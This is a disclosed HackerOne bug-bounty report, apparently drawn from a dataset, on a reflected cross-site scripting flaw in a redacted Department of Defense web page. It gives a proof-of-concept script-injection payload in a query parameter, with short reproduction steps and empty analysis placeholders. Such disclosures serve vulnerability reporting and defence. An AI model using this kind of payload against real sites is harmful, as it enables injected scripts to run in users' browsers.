---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1260823'
original_report_id: '1260823'
title: Reflected XSS - https://███
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: deptofdefense
created_at: '2021-07-13T18:06:48.271Z'
disclosed_at: '2021-07-29T19:44:12.547Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS - https://███

## Metadata

- HackerOne Report ID: 1260823
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: deptofdefense
- Disclosed At: 2021-07-29T19:44:12.547Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Greetings, I just found an XSS vulnerability on a page of one of your websites

URL : 
https://████=%22%3E%3Cscript%3Ealert(1)%3C/script%3E

```
https://███="><script>alert(1)</script>
```
By the way, could you look at my "duplicated" report when it is not?
I don't mean any disrespect, but this is not the same page.
thank you - https://hackerone.com/reports/1260789

Best regards, 
fiveguyslover

## Impact

A reflected XSS vulnerability happens when the user input from a URL or POST data is reflected on the page without being stored, thus allowing the attacker to inject malicious content.

## System Host(s)
████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
URL : 
https://█████=%22%3E%3Cscript%3Ealert(1)%3C/script%3E
the alert will be displayed

## Suggested Mitigation/Remediation Actions

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
